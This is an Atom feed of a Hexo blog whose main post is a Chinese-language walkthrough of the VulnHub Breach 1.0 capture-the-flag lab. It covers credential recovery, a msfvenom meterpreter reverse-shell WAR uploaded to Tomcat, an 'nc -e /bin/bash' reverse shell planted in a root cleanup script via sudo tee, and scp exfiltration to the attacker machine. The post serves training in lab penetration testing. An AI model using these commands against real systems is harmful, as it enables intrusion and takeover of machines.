<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CANVS</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2020-11-19T13:08:24.798Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulnhub breach1.0</title>
    <link href="http://example.com/2020/11/19/vulnhub-breach1-0/"/>
    <id>http://example.com/2020/11/19/vulnhub-breach1-0/</id>
    <published>2020-11-19T13:08:24.000Z</published>
    <updated>2020-11-19T13:08:24.798Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>vulnhub breach1.0</title>
    <link href="http://example.com/2020/10/26/vulnhub%20%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%20%20breach1_0/"/>
    <id>http://example.com/2020/10/26/vulnhub%20%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%20%20breach1_0/</id>
    <published>2020-10-26T03:48:21.970Z</published>
    <updated>2020-11-19T13:23:52.026Z</updated>
    
    <content type="html"><![CDATA[<p>国外大佬的wp</p><p><a href="http://camelinc.info/blog/2017/03/Vulnhub---Breach-1-boot2root-CTF-walkthrough/">http://camelinc.info/blog/2017/03/Vulnhub—Breach-1-boot2root-CTF-walkthrough/</a></p><p>镜像：<a href="https://www.vulnhub.com/entry/breach-1,152/">https://www.vulnhub.com/entry/breach-1,152/</a></p><p>靶机:192.168.110.140</p><p>攻击机kali 192.168.110.129</p><p><strong>网络适配器都设置成仅主机模式</strong></p><h2 id="0x01信息收集"><a href="#0x01信息收集" class="headerlink" title="0x01信息收集"></a>0x01信息收集</h2><p><a href="http://192.168.110.140/index.html">http://192.168.110.140/index.html</a></p><p><img src="./vulnhub-breach1-0/1.png" alt="图片"></p><p><strong>查看源码</strong></p><p><img src="https://uploader.shimo.im/f/kM3IY3tb5z2Q1t7f.png!thumbnail" alt="图片"></p><p>Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</p><p>Base64解码两次****</p><p><img src="https://uploader.shimo.im/f/lwgtGChyZIAw2vrI.png!thumbnail" alt="图片"><em>pgibbons:damnitfeel$goodtobeagang$ta</em></p><p>点击图片会进入到这里</p><p><img src="https://uploader.shimo.im/f/VuB9BmZSaxPUSwkl.png!thumbnail" alt="图片"></p><p><img src="https://uploader.shimo.im/f/E1F0J4DXQdYmir7j.png!thumbnail" alt="图片"></p><p>需要登陆，用刚刚得到的那串试试</p><p><img src="https://uploader.shimo.im/f/pmYYTueGIK80Ltjn.png!thumbnail" alt="图片"></p><p>用的是impresscms   （这里可以查看cms的漏洞  sql）</p><p>红框那会有三封未读邮件</p><p><img src="https://uploader.shimo.im/f/bZOXB2im38TEFBnz.png!thumbnail" alt="图片"></p><p>内容分别是</p><p><img src="https://uploader.shimo.im/f/tVBvunQnXNNb8tGG.png!thumbnail" alt="图片"></p><p><img src="https://uploader.shimo.im/f/3SC5clfYqJgynJlI.png!thumbnail" alt="图片"></p><p><img src="https://uploader.shimo.im/f/4Do2vwOxneZvIo0K.png!thumbnail" alt="图片"></p><p>链接下载了一个文件</p><p><img src="https://uploader.shimo.im/f/Q3KRvgeUvXOKiZtS.png!thumbnail" alt="图片"></p><p>原来是一个密钥</p><p><img src="https://uploader.shimo.im/f/KgMbNrGNCyQ5cPeR.png!thumbnail" alt="图片"></p><p>然后没有了线索，在页面摸爬了好久</p><p>发现了这个有个链接</p><p><img src="https://uploader.shimo.im/f/vRtEnGhLLGeKlQBK.png!thumbnail" alt="图片"></p><p>pcap  一看就是需要wireshark打开</p><p>但是加密了，需要上面ssl解密</p><p><img src="https://uploader.shimo.im/f/mcq5yJMJR4J3FB9G.png!thumbnail" alt="图片"></p><p>上面邮件内容告诉我们密码都设置为  tomcat</p><p><img src="https://uploader.shimo.im/f/A8sCdqz4ky4X26kq.png!thumbnail" alt="图片"></p><p>利用java 的keytool获取证书</p><p>将keystore放在c盘下</p><p>密码 tomcat</p><p><img src="https://uploader.shimo.im/f/cI7CFg8CKECqYExd.png!thumbnail" alt="图片"></p><p><img src="https://uploader.shimo.im/f/A0X4K6ViFnOWicuo.png!thumbnail" alt="图片"></p><p>接着导出 p12 证书</p><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore.p12 -deststoretype PKCS12<br>-srcalias tomcat<br></code></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/x2o0UjGd7vsAuZIX.png!thumbnail" alt="图片"></p><p>然后导入这个ssl证书最新版wireshark已经 ssl 改为 tls，其实ssl/tls都已统称通信加密协议，所以就放一块了</p><p>打开Wireshark  编辑–首选项–Protocols–SSL，点击右边的Edit：</p><p><img src="https://uploader.shimo.im/f/9xCaaUfqRJBvAj1V.png!thumbnail" alt="图片"></p><p>过滤规则只查看http包</p><p><img src="https://uploader.shimo.im/f/PVkSJmwW9AOHiwJX.png!thumbnail" alt="图片"></p><p>发现包含登录用户名密码的数据包， 采用http basic认证，认证数据包为： Basic</p><p>dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC    这是base64编码的用户名密码</p><p><img src="https://uploader.shimo.im/f/GJDr1g2Q61ZZjrAP.png!thumbnail" alt="图片"></p><p>解码出来  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">tomcat:Tt\5D8F(#!*u&#x3D;G)4m7zB<br></code></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/OsPutE71gZUy6SLY.png!thumbnail" alt="图片"></p><p>登录这个网站</p><p>查阅了多数资料这个需要挂代理，打开burpsuite 代理拦截关闭 浏览器开启bp的代理</p><p><a href="https://192.168.110.140:8443/_M@nag3Me/html">https://192.168.110.140:8443/_M@nag3Me/html</a></p><p><img src="https://uploader.shimo.im/f/oQwCWs1MWha0S73k.png!thumbnail" alt="图片"></p><p>输入刚刚得到的账号和密码</p><p>tomcat</p><p>Tt\5D8F(#!*u=G)4m7zB</p><p><img src="https://uploader.shimo.im/f/BQsc3PI7awMlP67u.png!thumbnail" alt="图片"></p><p>登录后得到这个后台网站</p><p><img src="https://uploader.shimo.im/f/xXEaXNKwboWx0RZA.png!thumbnail" alt="图片"></p><h2 id="0x02获取webshell"><a href="#0x02获取webshell" class="headerlink" title="0x02获取webshell"></a>0x02获取webshell</h2><p>上传一个txt文件发现只能上传war的文件</p><p><img src="https://uploader.shimo.im/f/kQenRWS0s5I4dfyD.png!thumbnail" alt="图片"></p><p>那么用msf生成一个马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">msfvenom -p java&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.110.129 lport&#x3D;1234 -f war -o test.war<br></code></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/WqaSoGUVnc6KuWg5.png!thumbnail" alt="图片"></p><p>然后进入msfexploit/multi/handler模块</p><p><img src="https://uploader.shimo.im/f/MJMkHFUGPjh87t5g.png!thumbnail" alt="图片"></p><p>设置payload</p><p><img src="https://uploader.shimo.im/f/rSooWC9kvzN2NrQx.png!thumbnail" alt="图片"><img src="https://uploader.shimo.im/f/GaKNKIR8CBb0JbDk.png!thumbnail" alt="图片"></p><p>上传生成的test.war文件并迅速点击/test</p><p>然后msf直击runun</p><p><img src="https://uploader.shimo.im/f/cd5mLuEUjl28WLSf.png!thumbnail" alt="图片"></p><p><img src="https://uploader.shimo.im/f/sBX2guGO8MmNZsag.png!thumbnail" alt="图片"></p><p><strong>getshell</strong></p><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>从python命令提示符到交互式shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;<br></code></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/7ch3PodMqT1IzYVE.png!thumbnail" alt="图片"></p><p>uname -a看能否内核提权发现版本不能</p><p><img src="https://uploader.shimo.im/f/cC3q1TlJBOBik6p3.png!thumbnail" alt="图片"></p><p>去网站根目录发现奇怪的文件</p><p><img src="https://uploader.shimo.im/f/kpAoIEBEwEywNxv4.png!thumbnail" alt="图片"></p><p>使用cat查看两个奇怪的php</p><p>发现数据库用户 为root  密码为空</p><p><img src="https://uploader.shimo.im/f/3bI21e9IlP3QimmX.png!thumbnail" alt="图片"></p><p>进入数据库</p><p><img src="https://uploader.shimo.im/f/0g2qHB2qLjmzKrSb.png!thumbnail" alt="图片"></p><p>一步一步数据库查看 库—–表——列</p><p>奇怪的password  是个MD5</p><p><img src="https://uploader.shimo.im/f/L9AGCYnfqzF8wsTf.png!thumbnail" alt="图片"></p><p>解密得到thelaststraw</p><p><img src="https://uploader.shimo.im/f/kPdK2epoY9SxOLsk.png!thumbnail" alt="图片"></p><p><img src="https://uploader.shimo.im/f/8eEZWmnQ3lsfnbTp.png!thumbnail" alt="图片"></p><p>查看有刚刚看到的用户</p><p>我们登陆一下</p><p><img src="https://uploader.shimo.im/f/ztiB1cGJdr0ryt5E.png!thumbnail" alt="图片"></p><p>查看一下历史命令</p><p>有用户登录的历史</p><p>然后现在没有密码</p><p><img src="https://uploader.shimo.im/f/zQ80GJlRhvNxBvlt.png!thumbnail" alt="图片"></p><p><img src="https://uploader.shimo.im/f/dEQQh1MhIWF9K5nu.png!thumbnail" alt="图片"></p><p>使用strings把图片可打印的字符给打印出来</p><p>只有bill.jpg 最后出现像故意留下的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">tEXtComment<br>coffeestains<br></code></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/1wt5ZLX5j4VBFIRd.png!thumbnail" alt="图片"></p><p>登陆成功</p><p><img src="https://uploader.shimo.im/f/M6yJwLlPXKYr6Ta3.png!thumbnail" alt="图片"></p><p>登陆靶机也成功</p><p><img src="https://uploader.shimo.im/f/MkBkSn8oi41m4qpc.png!thumbnail" alt="图片"></p><p>查看历史命令</p><p><img src="https://uploader.shimo.im/f/a247YMUVZmiXKjNF.png!thumbnail" alt="图片"></p><p><img src="https://uploader.shimo.im/f/oQWLCNGoVoftH38P.png!thumbnail" alt="图片"></p><p>使用nc反弹个shell</p><p>echo “nc -e /bin/bash 192.168.110.129 8888” &gt; shell.txt</p><p>然后在使用tee命令把shell.txt写入到tidyup.sh</p><p>cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</p><p>shell已经反弹过来了</p><p>tee的使用<a href="https://www.runoob.com/linux/linux-comm-tee.html">https://www.runoob.com/linux/linux-comm-tee.html</a></p><p><img src="https://uploader.shimo.im/f/YqknnFHQYBfbdShH.png!thumbnail" alt="图片"></p><p><img src="https://uploader.shimo.im/f/t7E6mzq2ekqi2RID.png!thumbnail" alt="图片"></p><p>使用scp下载图片</p><p>注：使用scp需要开启ssh服务<a href="https://www.runoob.com/linux/linux-comm-scp.html">https://www.runoob.com/linux/linux-comm-scp.html</a></p><p><img src="https://uploader.shimo.im/f/mVPL9iJ2ThjeQxTW.png!thumbnail" alt="图片"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">scp flair.jpg root@192.168.110.129:&#x2F;home&#x2F;<br></code></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/zmQl5hufSamrcibf.png!thumbnail" alt="图片"></p><p>查看图片</p><p><img src="https://uploader.shimo.im/f/cl1HHPyaNc8diy9k.png!thumbnail" alt="图片"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol><li>信息收集每一个地方都不要放过往往做不起眼的地方就会有关键信息</li><li>keytool的使用</li><li>scp远程拷贝命令</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;国外大佬的wp&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://camelinc.info/blog/2017/03/Vulnhub---Breach-1-boot2root-CTF-walkthrough/&quot;&gt;http://camelinc.info/blog/2017/0</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2020/10/26/hello-world/"/>
    <id>http://example.com/2020/10/26/hello-world/</id>
    <published>2020-10-26T02:43:58.653Z</published>
    <updated>2020-10-26T02:43:58.653Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
